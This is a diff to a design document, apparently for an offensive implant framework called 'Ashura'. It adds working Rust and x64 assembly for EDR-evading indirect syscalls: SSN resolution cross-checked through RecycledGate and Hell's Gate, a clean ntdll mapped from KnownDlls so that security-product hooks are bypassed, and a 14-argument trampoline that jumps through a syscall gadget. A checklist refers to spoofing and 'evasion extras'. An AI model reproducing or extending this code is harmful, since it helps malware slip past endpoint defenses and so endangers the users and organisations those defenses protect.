@@ -140,14 +140,130 @@ Design benefit:
 
 ---
 
-## 5) Integration checklist
+## 5) Three-way SSN consensus (Ashura production pattern)
+
+Naive RecycledGate trusts the sorted-export index as the SSN. In practice, Windows export-order gaps or EDR tampering can make a raw sorted-index unreliable. The hardened pattern validates each SSN through three independent sources:
+
+```rust
+fn validated_ssn_tuple(sorted_index: Option<u16>, nt_stub: Option<u16>, zw_stub: Option<u16>) -> Option<u16> {
+    let cached = sorted_index?;
+    match (nt_stub, zw_stub) {
+        (Some(nt), Some(zw)) if nt == zw && nt == cached => Some(nt),
+        _ => None,  // disagreement → fail closed
+    }
+}
+```
+
+The three sources:
+- **Sorted export index**: position in VA-sorted Zw* list (RecycledGate)
+- **Nt* stub read**: Hell's Gate extraction from the Nt-prefixed export
+- **Zw* stub read**: Hell's Gate extraction from the Zw-prefixed alias
+
+All three must agree. A disagreement means either the stubs are hooked (EDR changed bytes) or the export ordering is atypical (rare Windows build artifact). Either way, the function is excluded from the dispatcher and callers fail closed.
+
+**Advantage**: catches corrupted stubs that would pass RecycledGate alone, because RecycledGate never reads stub bytes. Also catches stub-read errors that would pass Hell's Gate alone, because Hell's Gate does not verify against export ordering.
+
+**Cost**: two extra 8-byte reads per validated function at init. Zero per-dispatch overhead (results are cached).
+
+---
+
+## 6) Shadow ntdll / KnownDlls resolver (concrete pattern)
+
+When in-memory ntdll cannot be trusted (aggressive hooks, in-memory patching), map a clean copy from `\KnownDlls\ntdll.dll`:
+
+```rust
+// Bootstrap: resolve NtOpenSection + NtMapViewOfSection from the in-process
+// ntdll (the only two calls against the real base).
+let open_section: NtOpenSectionFn = resolve(ntdll, HASH_NTOPENSECTION);
+let map_view: NtMapViewOfSectionFn = resolve(ntdll, HASH_NTMAPVIEWOFSECTION);
+
+// Open the KnownDlls section object (read + execute only)
+let mut section_handle = INVALID_HANDLE;
+let name = unicode_string("\\KnownDlls\\ntdll.dll");
+let mut oa = OBJECT_ATTRIBUTES { ObjectName: &name, .. };
+open_section(&mut section_handle, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa);
+
+// Map a pristine RX view
+let mut view_base: PVOID = null_mut();
+let mut view_size: SIZE_T = 0;
+map_view(section_handle, current_process(), &mut view_base, ..., PAGE_EXECUTE_READ);
+
+// Close the handle (the view holds its own reference)
+close(section_handle);
+
+// Use view_base as the resolution base for all SSN reads and gadget discovery
+```
+
+**Key contracts**:
+- The shadow view is `PAGE_EXECUTE_READ` — never written.
+- The `syscall;ret` gadget comes from the **same** base as the SSN reads. Mixing bases (shadow SSNs + real-ntdll gadget) produces correct SSNs but the gadget points into hooked memory.
+- Any mapping failure falls back to in-process resolution (never crashes).
+- The two bootstrap calls (NtOpenSection, NtMapViewOfSection) are the only calls against the potentially hooked in-process ntdll.
+
+---
+
+## 7) 14-argument trampoline (Ashura .s pattern)
+
+The existing 4/6/11-arg trampolines cover most NT APIs, but some paths need more (e.g. compound operations or custom wrappers). The 14-arg variant extends the shift-down pattern:
+
+```asm
+.globl indirect_syscall14
+indirect_syscall14:
+    push r15
+    push r14
+    push r13
+    push r12
+    ; rsp = A-0x20; user args 3..14 at [rsp+0x48..0xA0]
+    mov r11, rdx           ; gadget
+    mov r12, [rsp+0x48]    ; arg3
+    mov r13, [rsp+0x50]    ; arg4
+    ; Shift args 5..14 down two slots for the kernel ABI
+    mov r14, [rsp+0x58]
+    mov r15, [rsp+0x60]
+    mov [rsp+0x48], r14
+    mov [rsp+0x50], r15
+    mov r14, [rsp+0x68]
+    mov r15, [rsp+0x70]
+    mov [rsp+0x58], r14
+    mov [rsp+0x60], r15
+    mov r14, [rsp+0x78]
+    mov r15, [rsp+0x80]
+    mov [rsp+0x68], r14
+    mov [rsp+0x70], r15
+    mov r14, [rsp+0x88]
+    mov r15, [rsp+0x90]
+    mov [rsp+0x78], r14
+    mov [rsp+0x80], r15
+    mov r14, [rsp+0x98]
+    mov r15, [rsp+0xA0]
+    mov [rsp+0x88], r14
+    mov [rsp+0x90], r15
+    mov eax, ecx           ; SSN
+    mov rcx, r8            ; arg1
+    mov r10, rcx           ; kernel reads r10
+    mov rdx, r9            ; arg2
+    mov r8, r12            ; arg3
+    mov r9, r13            ; arg4
+    pop r12
+    pop r13
+    pop r14
+    pop r15
+    jmp r11                ; indirect through gadget
+```
+
+The pattern is mechanical: each pair of stack args is loaded into r14/r15, written two slots lower, then the next pair follows. The shift-by-two compensates for `ssn` and `gadget` occupying the first two Win64 parameter slots.
+
+---
+
+## 8) Integration checklist
 
 Before merging a new dispatcher:
 
-1. Validate `dispatch4/6/11` against known-good NTSTATUS panel.
+1. Validate `dispatch4/6/11/14` against known-good NTSTATUS panel.
 2. Validate mode switching does not change wrapper signatures.
 3. Verify gate bytes (`0F 05 C3`) before caching.
 4. Confirm fallback behavior when spoof context is missing.
-5. Stress-test with ASLR-enabled repeated runs.
+5. Validate three-way SSN consensus (sorted index vs Nt stub vs Zw stub).
+6. Stress-test with ASLR-enabled repeated runs.
 
 If any check fails, fix architecture first, then add obfuscation/evasion extras.
